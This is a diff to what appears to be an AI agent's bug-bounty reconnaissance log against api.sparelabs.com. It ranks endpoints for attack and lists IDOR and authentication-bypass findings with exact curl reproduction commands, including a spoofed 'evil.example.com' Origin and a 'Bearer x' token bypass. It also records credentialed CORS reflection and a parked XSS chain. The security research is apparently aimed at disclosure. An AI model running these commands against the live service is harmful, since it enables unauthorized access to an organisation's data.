@@ -16001,3 +16001,39 @@ testability: PASSIVE
 [LEARN] ACCEPTED AUTH @ api.sparelabs.com/v1/global/regions: Bearer-x bypass alive, sha256 exact-match — method-gated (GET-only) confirmed again.
 [LEARN] ACCEPTED IDOR @ api.sparelabs.com/v1/identity/workos/auth: SURVIVOR re-stamped; canonical body hash recorded (5b170be7…) with stable WorkOS client_id — strengthens reproducibility for report.
 [RISK] api.sparelabs.com: 92 — three unauthenticated pre-prod-gate data classes live + credentialed CORS reflection | platform.sparelabs.com: 42 — CSP infra leak stable | forms.sparelabs.com: 38 — bundle regression persists through rotation | web: 8 — static marketing | routing.sparelabs.com: 5 — dead envoy
+## 2026-08-21 10:47:06 UTC [api] (model bigpickle)
+[PRIO] api.sparelabs.com/v1/public/organizations/key/{key} | priority=8.65 | attack_surface=9 | business_value=10 | tech_exposure=6 | gate_ease=10 | cloud_surface=5 | freshness=10
+[PRIO] api.sparelabs.com/v1/identity/workos/auth | priority=8.45 | attack_surface=8 | business_value=8 | tech_exposure=9 | gate_ease=10 | cloud_surface=6 | freshness=10
+[PRIO] api.sparelabs.com/v1/global/regions | priority=7.50 | attack_surface=7 | business_value=7 | tech_exposure=7 | gate_ease=9 | cloud_surface=6 | freshness=10
+[HYP] IDOR @ api.sparelabs.com/v1/public/organizations/key/{key}
+class: IDOR
+asset: api.sparelabs.com/v1/public/organizations/key/{key}
+confidence: 98
+verify_steps: curl -sS -D- -H "Origin: https://evil.example.com" https://api.sparelabs.com/v1/public/organizations/key/spare → expect 200+351B sha256 3099f1baba93ebf19434837bdd0552a72f110a262bd01528eb48e8ba71e0e8cd; key/cambus → 404+131B; capture: /tmp/opencode/p0821k/b_key_spare.json
+[HYP] IDOR @ api.sparelabs.com/v1/identity/workos/auth
+class: IDOR
+asset: api.sparelabs.com/v1/identity/workos/auth
+confidence: 94
+verify_steps: curl -sS -X POST -H "Content-Type: application/json" -d '{"domain":"spare.com"}' https://api.sparelabs.com/v1/identity/workos/auth → expect 200+172B sha256 5b170be7b7829635753da63537ecfe9068be5eea0b0a6218ffd72b8770ae4414; neg control → 404+124B; capture: /tmp/opencode/p0821k/b_sso_spare.json
+[HYP] AUTH @ api.sparelabs.com/v1/global/regions
+class: AUTH
+asset: api.sparelabs.com/v1/global/regions
+confidence: 95
+verify_steps: curl -sS -H "Authorization: Bearer x" https://api.sparelabs.com/v1/global/regions | sha256sum → expect 27d83f3cd9f3ddb108c00967767698885a15b2592eecba5a3fae56d08514927b; no-header → 400; capture: /tmp/opencode/p0821k/b_regions.json
+[PARKED] WorkOS state-reflection XSS chain | reason: needs browser verification (AUTH_HELPED); Cloudflare blocks direct server-side probe
+[PARKED] engage/caseForms formId bridge | reason: requires real caseId; feature-flag gate precedes validation (AUTH_HELPED)
+[PARKED] staging API divergence | reason: OOS host; reference-only
+[FINAL] P1 IDOR @ api.sparelabs.com/v1/public/organizations/key/{key} | conf 98 | prio 8.90 | byte-stable 9th interval; fresh capture /tmp/opencode/p0821k/
+[FINAL] P2 IDOR @ api.sparelabs.com/v1/identity/workos/auth | conf 94 | prio 8.50 | SURVIVOR, never patched; canonical hash exact-match
+[FINAL] P3 AUTH @ api.sparelabs.com/v1/global/regions | conf 95 | prio 8.10 | 7th-interval byte-stable; controls intact
+[FINAL] EXHIBIT credentialed-CORS reflection | OPTIONS /v1/journeys → 204 + ACAO:reflected + ACAC:true + GET,HEAD,PUT,PATCH,POST,DELETE (h_preflight.txt); ACAO+ACAC on 200 org-key GET
+[NEXT] HUMAN: submit four-finding package NOW using /tmp/opencode/p0821k/ captures (hashes verified this cycle at ≤1 rps). No further re-run needed if submitted within the hour.
+[LEARN] ACCEPTED IDOR @ api.sparelabs.com/v1/public/organizations/key/{key}: ninth-interval byte-stable re-stamp post-revert; sha256 exact-match 3099f1bab…
+[LEARN] ACCEPTED IDOR @ api.sparelabs.com/v1/identity/workos/auth: SURVIVOR re-stamped; canonical body hash 5b170be7… reproduced exactly
+[LEARN] ACCEPTED AUTH @ api.sparelabs.com/v1/global/regions: Bearer-x bypass alive, sha256 exact-match 27d83f3c…
+[LEARN] OBSERVED CORS: preflight write-method reflection persists fleet-wide; ACAO reflection absent on regions 200 response while ACAC:true remains — partial header inconsistency worth noting in exhibit
+[RISK] api.sparelabs.com: 92
+[RISK] platform.sparelabs.com: 42
+[RISK] forms.sparelabs.com: 38
+[RISK] routing.sparelabs.com: 5
+[RISK] web: 8
